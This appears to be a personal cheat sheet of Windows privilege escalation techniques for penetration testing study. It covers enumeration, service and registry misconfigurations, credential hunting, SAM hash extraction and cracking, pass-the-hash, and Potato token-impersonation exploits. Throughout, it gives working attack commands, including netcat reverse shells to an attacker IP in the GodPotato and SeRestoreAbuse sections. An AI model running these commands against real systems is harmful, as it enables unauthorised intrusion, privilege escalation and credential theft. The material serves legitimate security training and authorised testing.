# Summary

## Tools
 
- `accesschk.exe`
- `psexec.exe`
- `plink.exe`
- [winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/winPEASexe):
	- enable colour terminal output:
		1. `REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1`
		2. `start /b&exit`
		3. `winpeas.exe` or `winpeas.bat`
- [PrivescCheck](https://github.com/itm4n/PrivescCheck) - *to try out*
- [PowerUP](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1):
	- `powershell -ep bypass`
	- `import-module .\PowerUp.ps1`
	- `Invoke-AllChecks`
- Seatbelt: [code](https://github.com/GhostPack/Seatbelt) and [exe](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Seatbelt.exe)
- [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)

## Techniques - MindMap

- [Enumeration](#Enumeration)
- [Kernel Exploits](#kernelexploits)
- [Service Exploits](#ServiceExploits)
	- [Service Enumeration](#ServiceEnumeration)
	- [Insecure Service Permissions](#InsecureServicePermissions)
	- [Unquoted Service Path](#UnquotedServicePath)
	- [Weak Registry Permissions](#WeakRegistryPermissions)
	- [Insecure Service Executables](#InsecureServiceExecutables)
	- [DLL Hijacking](#DLLHijacking)
- [Registry Exploits](#RegistryExploits)
	- [AutoRuns](#AutoRuns)
	- [AlwaysInstallElevated](#AlwaysInstallElevated)
- [Passwords](Passwords)
	- [Passwords in Registry](#PasswordsInRegistry)
	- [Saved Creds](#SavedCreds)
	- [Sensitive Files](#SensitiveFiles)
	- [SAM](#SAM)
	- [Pass the Hash](#PassTheHash)
- [Scheduled Tasks](##ScheduledTasks)
- [Insecure GUI Apps](#InsecureGUIApps )
- [StartUp Apps](#StartupApps)
- [Installed Applications](#InstalledApplications)
- [Localhost Applications](#LocalhostApplications)
- [Hot Potato](#HotPotato)
- [Token Impersonation](#TokenImpersonation)
	- [Rotten Potato](#RottenPotato)
	- [Juicy Potato](#JuicyPotato)
	- [Rogue Potato](#RoguePotato)
	- [Print Spoofer](#PrintSpoofer)
	- [GodPotato](#GodPotato)
- [Privileges](#Privileges)
	- [SeBackupPrivilege](#SeBackupPrivilege)
	- [SeRestorePrivilege](#SeRestorePrivilege)
	- [SeTakeOwnershipPrivilege](#SeTakeOwnershipPrivilege)
	- [SeManageVolumePrivilege](#SeManageVolumePrivilege)
	- [SeAssignPrimaryTokenPrivilege](#SeAssignPrimaryTokenPrivilege)
	- [SeLoadDriverPrivilege](#SeLoadDriverPrivilege)
	- [SeDebugPrivilege](#SeDebugPrivilege)
	- [Privileged File Write](#Privileged-File-Write)
- [Other Techniques](#OtherTechniques)
	- [WSL](#WSL)
- [Extra](#Extra)
	- [AVEnumeration](#AVEnumeration)
	- [permissionsCheck](#permissionsCheck)
	- [Persistence](#Persistence)
	- [Alternate Data Streams](#AlternateDataStreams)
	- [AppData](#AppData)
	- [Nishang One Liner](#NishangOneLiner)
	- [WindowsTransfer](#WindowsTransfer)
		- [SMBserver](#SMBserver)
		- [evil-winrm](#evil-winrm)
	- [From Local Service To System](#FromLocalServiceToSystem)
	- [Raw Malicious EXE](#RawMaliciousEXE)
	- [Raw Malicious DLL](#RawMaliciousDLL)
	- [UAC Bypass](#UACBypass)

## Enumeration

- **user and hostname**
	- `whoami`
	- `whoami /priv`
	- `whoami /all` - detailed info and SID
- **current user's groups**
	- CMD - `whoami /groups`
	- Powershell - `whoami /groups /fo csv | ConvertFrom-Csv | select -Property 'group name','type', 'sid'`
- **users and groups**
	- CMD
		- `net user` 
		- `net localgroup`, `net localgroup "<GROUPNAME>"`
	- Powershell
		- `Get-LocalUser`
		- `Get-LocalGroup`
		- `Get-LocalGroupMember -Group "<GROUP NAME>"`
	- identify "*valuable*" users: members of "Administrators", "Backup Operators", "Remote Desktop Users", and "Remote Management Users" groups
	- identify users/groups that contain "admin" string
	- [Windows Built-in Users, Default Groups and Special Identities](https://ss64.com/nt/syntax-security_groups.html)
- **system information**
	- `systeminfo`
	- Powershell
		- system: `Get-CimInstance CIM_ComputerSystem`
		- bios: `Get-CimInstance CIM_BIOSElement`
		- OS: `Get-CimInstance CIM_OperatingSystem`
		- CPU: `Get-CimInstance CIM_Processor`
		- HDD: `Get-CimInstance Win32_LogicalDisk -Filter "DeviceID = 'C:'"`
- **network information**
	- `ipconfig /all`
	- `route print`
	- `netstat -ano`
- **installed apps**
	- `Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`
	- `Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`
	- `dir "C:\Program Files"`
	- `dir "C:\Program Files (x86)"`
- **running process**
	- `tasklist`
	- `Get-Process` e `Get-Process -FileVersionInfo -ErrorAction SilentlyContinue` 
- **enumeration home directory**
	- `Get-ChildItem -Path C:\Users\<USERNAME>\ -Include *.txt,*.ini,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.log,*.kdbx -File -Recurse -ErrorAction SilentlyContinue`
	- ***all files*** (*from current dir*)
		- `Get-ChildItem -Path . -Include *.* -File -Recurse -ErrorAction SilentlyContinue`
		- `dir /a /b /s`
- **powershell goldmine**
	- `Get-History`
	- `(Get-PSReadlineOption).HistorySavePath`
	- any *ConsoleHost_history.txt* files
		- (*powershell*) `Get-ChildItem -Path C:\ -Recurse -File -Force -ErrorAction SilentlyContinue | Where-Object { $_.FullName -match 'ConsoleHost_history.txt' }`
		- (*cmd*) `dir /b /s \ConsoleHost_history.txt`
- **transcript file**
	- "Documents" user directory
	- identify files or directories that contain "transcript"
		- `powershell -c "Get-ChildItem -Path C:\ -Recurse -File -Force -ErrorAction SilentlyContinue | Where-Object { $_.FullName -match 'transcript' }"`
- **environment variables**
	- `cmd /c "set"`
- ***takeaway concepts***
	- if there is an IIS webserver, check `web.config` file
	- if "git" is installed, in Windows this represents an anomaly
	- checking privileges of running apps. Webapp or databases runned by privileged users can be easy vectors of privilege escalation

## KernelExploits

- Kernel and hotfix enumeration:
	- `systeminfo`
	- `wmic qfe get Caption,Description,HotFixID,InstalledOn`
	- `winPEAS`
- finding exploit:
	- Google
	- ExploitDB
	- [Windows Kernel Exploits](https://github.com/SecWiki/windows-kernel-exploits)
	- [Windows Exploit Suggester](https://github.com/bitsadmin/wesng) - Automated enumeration:
		1.  `systeminfo > systeminfo.txt`
		2. `wes.py --update`
		3. `wes.py systeminfo.txt`
	- [Watson](https://github.com/rasta-mouse/Watson) - Automated enumeration:
		1. `watson.exe`

## ServiceExploits

### ServiceEnumeration

- Service list:
	- `sc queryex type=service state=all`
	- `reg query HKLM\SYSTEM\CurrentControlSet\Services\` - one key for each service
	- `wmic service get name,displayname,pathname,startmode`
	- `Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}` - checking which services are NOT installed in `C:\Windows\System32`
- Service information, including `START_TYPE`, `BINARY_PATH_NAME` and `SERVICE_START_NAME`:
	- `sc qc <service name>`
	- Through the registry:
		-  `START_TYPE` ([values lookup](https://superuser.com/questions/1199112/how-to-tell-the-state-of-a-service-from-the-registry)) - `reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\<SERVICENAME> /v Start`
		- `BINARY_PATH_NAME` - `reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\<SERVICENAME> /v ImagePath`
		- `SERVICE_START_NAME` - `reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\<SERVICENAME> /v ObjectName`
- Status information service (`STATUS`):
	- `sc query <service name>`
- Edit service configuration:
	- `sc config <service name> <option>= <value>`
- Start/stop service:
	- `sc.exe start/stop <service name>`
	- `net start/stop <service name>`

### InsecureServicePermissions

Vulnerable service identikit:
1. service for which you have one of the following privileges: `SERVICE_ALL_ACCESS` o `SERVICE_CHANGE_CONFIG`
2. service that starts automatically or for which you have start and stop privileges (`SERVICE_START` and `SERVICE_STOP`)
3. service runned by service account with elevated privileges, for example `LocalSystem`

Vulnerable service enumeration:
- `winpeas.exe servicesinfo` - ideal
- `accesschk.exe /accepteula -uwcqv <username> *` or `accesschk.exe /accepteula -uwcqv "Authenticated Users" *` - alternatives

After identifying the service, we check the necessary information of the points 1, 2 and 3:
- `accesschk.exe /accepteula -cquvw <username> <service name>`
- `sc qc <service name>`
- **Requirements**:
	- `SERVICE_ ALL_ACCESS` or `SERVICE_CHANGE_CONFIG` - point 1
	- `SERVICE_START_NAME` equal to `LocalSystem` (approximately) - point 3
	- reboot service:
		- if `START_TYPE` equal to `3 DEMAND_START`, `SERVICE_START` and `SERVICE_STOP` are required
		- if `START_TYPE` equal to `2 AUTO_START`, `SeShutdownPrivilege` is required

Exploitation:
- create an executable reverse shell with *msfvenom*
- editing configuration service:
	- `sc config <service name> binpath= "\"<path_to_reverse>\""`
- reboot vulnerable service: 
	- `sc query <service name>` - checking service status 
	- (if `DEMAND_START`) `net stop <service name>` and `net start <service name>` (alternative: `sc`)
	- (if `AUTO_START` and `SeShutdownPrivilege` privilege) `shutdown /r /t 0`

### UnquotedServicePath

Vulnerable service identikit:
1. service where the executable path contains spaces ***and*** is not enclosed in inverted commas
2. service that starts automatically or for which you have start and stop privileges (`SERVICE_START` and `SERVICE_STOP`)
3. write permission in one of directories in which, first, presence of the executable is checked
4. service runned by service account with elevated privileges, for example `LocalSystem`

Vulnerable service enumeration:
- `winpeas.exe servicesinfo`
- `Get-UnquotedService` (da `PowerUp`) - ideal solution because:
	- identifies the path where the user has write permissions
	- identifies the privileges with which the service is running (`LocalSystem`, etc.)
	- indicates if user can reboot the service
	- provides a Powershell function to generate a binary that exploits the vulnerability
- `wmic service get name,displayname,pathname,startmode |findstr /i /v "c:\windows\\" |findstr /i /v """` - from CMD
- `Get-WmiObject -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select Name,DisplayName,StartMode,PathName` - from Powershell

Check start/stop privileges of service:
- `accesschk.exe /accepteula -cquv <username> <service name>`
- `sc qc <service name>`
- **Requirements**: 
	- if `START_TYPE` equal to `3 DEMAND_START`, `SERVICE_START` and `SERVICE_STOP` are required
	- if `START_TYPE` equal to `2 AUTO_START`, `SeShutdownPrivilege` is required

Check permission to **write** in one of the directories where Windows will check, **first**, for the presence of the executable:
- `accesschk.exe /accepteula -dquvw "</path/to/folder>"`
- `icacls "</path/to/folder>"`

check service's user:
- `sc qc <service name>`
- **Requirement**: `SERVICE_START_NAME` equal to `LocalSystem` (approximately)

Exploitation:
- create an executable reverse shell with *msfvenom*
- move the executable in the directory where you have write permission
- reboot vulnerable service:
	- (if `DEMAND_START`) `net stop <service name>` and `net start <service name>` (alternative: `sc`)
	- (if `AUTO_START` and `SeShutdownPrivilege` privilege) `shutdown /r /t 0`

### WeakRegistryPermissions

Vulnerable service identikit:
1. service for which the associated registry keys can be modified
2. service that starts automatically or for which you have start and stop privileges (`SERVICE_START` and `SERVICE_STOP`)
3. service runned by service account with elevated privileges, for example `LocalSystem`

Vulnerable service enumeration:
- `winpeas.exe servicesinfo` - ideal
- `accesschk.exe /accepteula <username> -kquvws hklm\System\CurrentControlSet\services` - **Requirement**: `KEY_ALL_ACCESS`
- `Get-Acl -Path HKLM:\SYSTEM\CurrentControlSet\Services\<service name> | fl` (PowerShell) - **Requirement**: `Allow FullControl` for our user

Check start/stop privileges of service:
- `accesschk.exe /accepteula -cquv <username> <service name>`
- `sc qc <service name>`
- **Requirements**: 
	- if `START_TYPE` equal to `3 DEMAND_START`, `SERVICE_START` and `SERVICE_STOP` are required
	- if `START_TYPE` equal to `2 AUTO_START`, `SeShutdownPrivilege` is required

check service's user:
- `sc qc <service name>`
- **Requirement**: `SERVICE_START_NAME` equal to `LocalSystem` (approximately)

Exploitation:
- create an executable reverse shell with *msfvenom*
- move the executable in the target directory
- edit `ImagePath` registry key of vulnerable service
	- `reg add HKLM\SYSTEM\CurrentControlSet\services\<service nam> /v ImagePath /t REG_EXPAND_SZ /D <path reverse.exe> /f`
- reboot vulnerable service:
	- (if `DEMAND_START`) `net stop <service name>` and `net start <service name>` (alternative: `sc`)
	- (if `AUTO_START` and `SeShutdownPrivilege` privilege) `shutdown /r /t 0`

### InsecureServiceExecutables

Vulnerable service identikit:
1. write permissions in the directory where is located the executable runned by a service
2. service that starts automatically or for which you have start and stop privileges (`SERVICE_START` and `SERVICE_STOP`)
3. service runned by service account with elevated privileges, for example `LocalSystem`

Vulnerable service enumeration:
- `winpeas.exe servicesinfo` - ideal
- `Get-ModifiableServiceFile` - *PowerUp.ps1*

Write permission check on the service executable:
- `accesschk.exe /accepteula -quvw "<path to exe>"` - **Requirement**: `FILE_ALL_ACCESS` or write permission

Check start/stop privileges of service:
- `accesschk.exe /accepteula -cquv <username> <service name>`
- `sc qc <service name>`
- **Requirements**: 
	- if `START_TYPE` equal to `3 DEMAND_START`, `SERVICE_START` and `SERVICE_STOP` are required
	- if `START_TYPE` equal to `2 AUTO_START`, `SeShutdownPrivilege` is required

Exploitation:
- create an executable reverse shell with *msfvenom*
- backup original executable:
	- `copy "</abs/path/to/original/exe>" C:\Temp`
- overwrite executable of vulnerabile service:
	- `copy /Y <abs path revshell> "</asb/path/to/original/exe>"`
- reboot vulnerable service:
	- (if `DEMAND_START`) `net stop <service name>` and `net start <service name>` (alternative: `sc`)
	- (if `AUTO_START` and `SeShutdownPrivilege` privilege) `shutdown /r /t 0`

### DLLHijacking

Vulnerable service identikit:
1. write permission in one of the PATH directories
2. "DLL not found" for executable of service
3. service for which you have start and stop privileges (`SERVICE_START` and `SERVICE_STOP`)
4. service runned by service account with elevated privileges, for example `LocalSystem`

Writable directories of PATH from our user:
- `winpeas.exe servicesinfo` - ideal
- `for %A in ("%path:;=";"%") do ( accesschk.exe /accepteula %username% -dquvw %A 2>nul )` - by me (all PATH directories with `echo %PATH:;=&echo.%`) -  alternatively, you can locate the directories 'NAME_NOT_FOUND' in *procmon*.

*Magic* is to find which executable of a vulnerable service runs a missing DLL.

Analysis of the vulnerable service executable:
1. transfer executable in target machine
2. running `procmon` as Administrator. You need enable `Show Registry Activity` and `Show Network Activity`
3. stop current capture e clean the list
4. press  `CTRL+l` and add the following filter: `Process name is <executable name>`
5. start the capture again and launch the executable
6. in the results, we see which DLLs we get `NAME NOT FOUND` for.

Check start/stop privileges of service:
- `accesschk.exe /accepteula -cquv <username> <service name>`
- **Requirements**: `SERVICE_ALL_ACCESS` o `SERVICE_START` e `SERVICE_STOP`

Exploitation:
- create a DLL reverse shell with *msfvenom*
- trasfer DLL in one of directories PATH where we have write permission. DLL must have the same name as the missing one
- reboot vulnerable service:
	-  `net start/stop <service name>` (alternative: `sc start/stop <service name>`)

## RegistryExploits

### AutoRuns

*AutoRuns* is a Windows functionality whereby a specific program can be executed when an user logs in the system. Such functionality is enabled by specific registry keys.

There are some registry keys that we should give a look:
- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`

Vulnerable identikit:
1. identify an executable of a *AutoRun*
2. possible misconfigurations:
	- write permission in the directory where executable is located
	- path to the executable has spaces and is not enclosed in inverted commas: [unquoted service path](#unquotedservicepath)
	- write permission o full control of executable

Vulnearble *AutoRun* enumeration:
- `winpeas.exe applicationsinfo` - ideal
- `autorunsc.exe` from [Autoruns - Sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns)
- manually:
	- `reg query <HKLM e HKCU>\Software\Microsoft\Windows\CurrentVersion\<Run e RunOnce>`
	- `accesschk.exe /accepteula %username% -quvw <path to exe AutoRun>` - **Requirements**: `FILE_ALL_ACCESS` or write permission

Exploitation:
- create an executable reverse shell with *msfvenom*
- backup original executable:
	- `copy "</abs/path/to/original/exe>" C:\Temp`
- overwrite executable of vulnerabile service:
	- `copy /Y <abs path revshell> "</asb/path/to/original/exe>"`
-  force the user whose privileges we wish to obtain to restart the machine

### AlwaysInstallElevated

It is a Windows policy who allows unprivileged user to install a MSI program with elevated privilege.

Vulnerable identikit:
1. `AlwaysInstallElevated` pari ad 1 in `HKLM`
2. `AlwaysInstallElevated` pari ad 1 in `HKCU`

Vulnerability enumeration:
- `winpeas.exe systeminfo` - ideal
- manually:
	- `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2> nul` - **Requirement**: value equal to 1
	- `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2> nul` - **Requirement**: value equal to 1

Exploitation:
- create a MSI reverse shell with *msfvenom*
- installing MSI file:
	- `msiexec /quiet /qn /i <reverse.msi>`

## Passwords

### PasswordsInRegistry

Search "password" string in registry:
- `reg query HKLM /f password /t REG_SZ /s`
- `reg query HKCU /f password /t REG_SZ /s`
- NB: above queries will generate many results so it is often recommended to look in specific locations.

Enumeration:
- `winpeas.exe filesinfo userinfo` - ideal

Special attention:
- Autologon (AKA - `WinLogon`):
	- `reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"`
- PuTTY:
	- `reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s`

Spawn shell with newly found credentials:
- `winexe -U '<username>%<password>' --system //<target IP> cmd.exe`

### SavedCreds

`runas` is a Windows command-line tool which allows a user to run specific tools, programs or commands with different permissions than the current user has. If the user's credentials are cached on the system, the `runas` command can be used to flag `/savecred` which will automatically authenticate and execute the command as that user.

Enumeration:
- `winpeas.exe windowscres` - ideal
- `cmdkey /list`

Exploitation:
- create an executable reverse shell with *msfvenom*
- `runas /savecred /user:<username> <path to reverse.exe>`

### SensitiveFiles

Searching sensitive files depends on the apps installed in the machine:
- recursive search for file names containing the string 'pass' or '.config' (current directory)
	- `dir /b /s *pass* == *.config*`
- recursive search for files containing a certain string (current directory)
	- `findstr /s /i /m /C:"<string>" *.*`
	- for line number in the file, remove `/m` and add `/n` and `/p`
- recursive search for `.xml`, `.ini` or `.txt` files containing the string 'password' (current directory)
	- `findstr /si password *.xml *.ini *.txt`
	- for line number in the file, remove `/m` and add `/n` and `/p`
- recursive search of *kdbx* files
	- `Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue`
- if XAMPP is installed, recursive search for `.txt` and `.ini` files in the installation directory
	- `Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue`
- "strings" command *windows-like*
	- `more < <FILE.exe> | findstr "."`

Enumeration:
- `winpeas.exe cmd searchfast filesinfo`

Beware of any username/password stored in the `unattend.xml` file.

### SAM

SAM file contains local users' hashes of password. These hashes are encrypted with a key that is located in SYSTEM file. The files are located in `C:\Windows\System32\Configig\`.

Backup of these files can be found in directories:
- `C:\Windows\Repair`
- `C:\Windows\System32\config\RegBack`
- to search for possible SAM backups
	- `cmd /c "dir /b /s SAM"` (`C:\Windows\SysWOW64\LogFiles\SAM` file is standard)

Let us assume that we can read the SAM and SYSTEM files.

Exploitation:
- file transfer to the attacking machine
- hashes extraction:
	- `python3 examples/secretsdump.py -sam </PATH/TO/SAM> -security </PATH/TO/SECURITY> -system </PATH/TO/SYSTEM> LOCAL`
- we have hashes. And now?
	- cracking with hashcat: `hashcat -m 1000 --force <hash NT admin user> </path/to/wordlist>`
	- [Pass The Hash](#PassTheHash)

### PassTheHash

If we can obtain the hashes of a user with elevated privileges, the best solution is to use them to have a privileged shell.

**Usage**: `pth-winexe --system -U '<user>%<hash LM>:<hash NT>' //<target IP> cmd.exe`

## ScheduledTasks

Vulnerability identikit - Two options:
- "weak file permissions" on the script executed by the scheduled task
- possibility to create or edit scheduled tasks (only on older Windows versions)

Scheduled task list:
- `schtasks /query /fo LIST /v` - CMD
- `schtasks /query /fo LIST /v | findstr /i /C:"TaskName" /C:"Next Run Time" /C:"Last Run Time" /C:"Author" /C:"Task To Run"` - CMD #2
- `Get-ScheduledTask | ft TaskName,TaskPath,State` - PowerShell

Detection:
- tools such as [**Sysinternals Autoruns**](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns) are able to detect system changes, e.g. by showing scheduled tasks
- tools such as **[TCPView](https://docs.microsoft.com/en-us/sysinternals/downloads/tcpview)** and **[Process Explore](https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer)** can help identify remote connections of suspicious services or processes
- CMD command seen above

From the output of `schtasks`, a number of properties are to be verified:
- "Author" and "Run As User": under which user account the scheduled task is executed
- "Last Run Time" and "Next Run Time": whether the task will be executed again and when/under what conditions
- "Task To Run": actions that are executed by the scheduled task

If the task is executed by a privileged user and the specific binary in the 'Task To Run' is vulnerable to, for example, one of the misconfigurations seen before, it is possible to scale privileges via *scheduled tasks*.

## InsecureGUIApps

Vulnerability identikit:
- able to run a GUI app with elevated privileges
- misuse of app functionalities to execute commands or get a shell

It is a matter of performing actions to break out of a privileged environment. The command can be useful: 
- `tasklist /v`

## StartupApps

Windows allows users to run automatically specific programs after successful authentication. This can be done by placing the executables in specific directories.  This is a technique equivalent to [AutoRuns](#AutoRuns).

The specific folders containing such `StartUp` are:
- `C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`, for current user
- `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup`, for any user

Vulnerability identikit:
1. write permission in one of directories listed above
2. permission/possibility to restart the system with the user whose privileges we wish to obtain

Enumeration vulnerable *StartUp*:
- `winpeas.exe` - ideal
- `autorunsc.exe` from [Autoruns - Sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns)
- manually:
	- `accesschk.exe /accepteula %username% -dquvw "C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"`
	- `accesschk.exe /accepteula %username% -dquvw "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"`
	- **Requirement**: `FILE_ALL_ACCESS` or write permission

Exploitation:
- create an executable reverse shell with *msfvenom*
- trasfer reverse shell in one of misconfigured `StartUp` directories
- force a system reboot by the user whose privileges we wish to obtain

## InstalledApplications

Enumeration installed applications:
- `wmic product get name,version`

.git directory enumeration:
- "git" in Windows is an anomaly
- `dir .git /AD /s`

General tips for detecting installed applications with vulnerabilities:
- ***verify the privileges of running programmes***
- [ExploitDB](https://www.exploit-db.com/?type=local&platform=windows):
	- "Type": local
	- "Platform": Windows
	- "Search": "priv esc"
	- "Has App": checked
- running programmes: 
	- `tasklist /v`
- not standard process:
	- `.\seatbelt.exe NonStandardProcess`
- winPEAS:
	- `winpeas.exe processinfo`

## LocalhostApplications

Identify applications listening only on internal network interface:

```cmd
netstat -ano
```

## HotPotato

"Hot Potato" is the name of a privilege escalation technique that consists in combining two well-known Windows problems, namely NBNS spoofing and NTLM relay, with the configuration of a fake WPAD proxy server running locally on the target host.

Vulnerability identikit:
1. Vulnerable Windows versions:
	- Windows 7
	-  Windows 8
	-  Windows 10
	-  Windows Server 2008
	-  Windows Server 2012

**Patch**: MS16-075, published on 14/06/2016.

Exploitation:
- [https://github.com/foxglovesec/Potato](https://github.com/foxglovesec/Potato):
	- `potato.exe -ip <victim IP> -cmd "</abs/path/to/reverse.exe>" -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true`
	- (alternative) `potato.exe -ip -cmd [cmd to run] -disable_exhaust true -disable_defender true`

## TokenImpersonation

### RottenPotato

A PE tecniche that consists of escalate privilege from service account or user account with `SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege` privileges to `SYSTEM`.

Vulnerability identikit:
1. privileges: `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`
2. Vulnerable Windows versions:
	-   Windows 7 Enterprise
	-   Windows 8.1 Enterprise
	-   Windows 10 Enterprise (**version <1809**)
	-   Windows 10 Professional (**version <1809**)
	-   Windows Server 2008 R2 Enterprise
	-   Windows Server 2012 Datacenter
	-   Windows Server 2016 Standard

Exploitation:
- [https://github.com/breenmachine/RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG)

### JuicyPotato

*Juicy Potato is Rotten Potato on steroids*.

Vulnerability identikit:
1. privileges: `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`
2. Vulnerable Windows versions:
	-   Windows 7 Enterprise
	-   Windows 8.1 Enterprise
	-   Windows 10 Enterprise (**version <1809**)
	-   Windows 10 Professional (**version <1809**)
	-   Windows Server 2008 R2 Enterprise
	-   Windows Server 2012 Datacenter
	-   Windows Server 2016 Standard

Exploitation:
- [https://github.com/ohpe/juicy-potato](https://github.com/ohpe/juicy-potato)
	- `.\JuicyPotato.exe -l 1337 -p </path/to/reverse.exe> -t * -c {<CLSID>}`
	- [CLSID Table 1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md) - [CLSID Table 2](https://ohpe.it/juicy-potato/CLSID/) - [CLSID script](http://ohpe.it/juicy-potato/CLSID/GetCLSID.ps1) - `reg query HKCR\CLSID\ | findstr "<search clsid>"`

### RoguePotato

One of the most recent *potato* exploit.

Vulnerability identikit:
1. privileges: `SeImpersonatePrivilege` o `SeAssignPrimaryTokenPrivilege`
2. Vulnerable Windows versions:
	-   Windows 10 (**version >=1809**)
	-   Windows Server 2019 Standard

 - Exploitation:
	 - [https://github.com/antonioCoco/RoguePotato)](https://github.com/antonioCoco/RoguePotato)
		- on attacker machine:
			- `socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999`
		- on victim machine:
			- `.\RoguePotato.exe -r YOUR_IP -e "command" -l 9999`

### PrintSpoofer

PE technique from `LOCAL/NETWORK SERVICE` to `SYSTEM` by abusing `SeImpersonatePrivilege` privilege on Windows 10 and Windows Server 2016/2019. It can considerated as a better alternative to [Rogue Potato](#RoguePotato). It isn't a CVE, it is a misconfiguration.

Vulnerability identikit:
- privileges: `SeImpersonatePrivilege` o `SeAssignPrimaryTokenPrivilege`
- Vulnerable Windows versions:
	- Windows 10 (**version <1607**)
	- Windows Server 2016
	- Windows Server 2019

Enumeration:
- privileges:
	- `whoami /priv`
- system:
	- `systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"`

Exploitation:
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer):
	- `.\PrintSpoofer.exe -i -c cmd` oppure `.\PrintSpoofer.exe -i -c "</absolute/path/to/reverse.exe>"`

### GodPotato

Vulnerability identikit:
- privileges: `SeImpersonatePrivilege`
- Vulnerable Windows versions:
	- Windows8 (da *readme*)
	- Windows 11 (da *readme*)
	- Windows Server 2012 (da *readme*)
	- Windows Server 2022 (da *readme*)
	- Windows 10 Pro 10.0.18362 con KB4540673 (last hotfix)

Enumeration:
- privileges:
	- `whoami /priv`
- hotfixes installed:
	- `wmic qfe list`
- .NET version installed:
	- (*powershell*) `Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -Recurse | Get-ItemProperty -Name version -EA 0 | Where { $_.PSChildName -Match '^(?!S)\p{L}'} | Select PSChildName, version`
	- (*cmd*) `reg query "HKLM\SOFTWARE\Microsoft\Net Framework Setup\NDP" /s`

Exploitation:
- [GitHub - BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato):
	- `.\GodPotato -cmd "cmd /c whoami"`
	- `.\GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012""`

## Privileges

- detection: `whoami /priv`

Resource:
- [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin)

### SeBackupPrivilege

Vulnerability identikit:
- `SeBackupPrivilege` privilege for current user

Exploitation:
1. create a folder:
	- `mkdir C:\Temp`
2. export the `HKLM\SAM` registry hive:
	- `reg save hklm\sam C:\Temp\sam.hive`
3. export the `HKLM\SYSTEM`:
	- `reg save hklm\system C:\Temp\system.hive`
4. transfer the exported hive on attacker machine
5. extract local hashes (two options):
	- `pypykatz registry --sam <file SAM> <file SYSTEM>`
	- `secretsdump.py -sam SAM -system SYSTEM LOCAL`
6. Pass The Hash (alternative):
	- `evil-winrm -i <target IP> -u Administrator -H "<hash NT utente Administrator>"`
	- `psexec.py -hashes ":<ADMINISTRATOR_NTLM>" <Administrator>@<TARGET_IP>`

Details: [https://github.com/gtworek/Priv2Admin/blob/master/SeBackupPrivilege.md](https://github.com/gtworek/Priv2Admin/blob/master/SeBackupPrivilege.md)

***nice to try*** (not tested):
- [Backup-DumpNTDS.ps1](https://raw.githubusercontent.com/Hackplayers/PsCabesha-tools/master/Privesc/Backup-DumpNTDS.ps1)
- [Backup-ToSystem.ps1](https://raw.githubusercontent.com/Hackplayers/PsCabesha-tools/master/Privesc/Backup-ToSystem.ps1)

### SeRestorePrivilege

Vulnerability identikit:
- `SeRestorePrivilege` privilege for current user

Exploitation:
1. cloning [https://github.com/xct/SeRestoreAbuse](https://github.com/xct/SeRestoreAbuse)
2. compiling project with Visual Studio
3. upload on target these files:
	- SeRestoreAbuse.exe
	- nc64.exe (optional)
4. exploitation
	- **NB**: running `.\SeRestoreAbuse.exe "cmd /c ..."` will *most likely* result in an error similar to "`RegCreateKeyExA result: 0[...]RegSetValueExA result: 0[...]SeRestoreAbuse.exe : start-service : Service 'Secondary Logon (seclogon)' cannot be started due to the following error: Cannot start`". The error is irrelevant for the correct execution of the command
	- reverse shell with `SYSTEM` privileges
		- (on attacker) `rlwrap nc -nvlp <REV PORT>`
		- `.\SeRestoreAbuse.exe "cmd /c C:\absolute\path\to\nc64.exe -e cmd.exe <IP ATTACKER> <REV PORT>"`
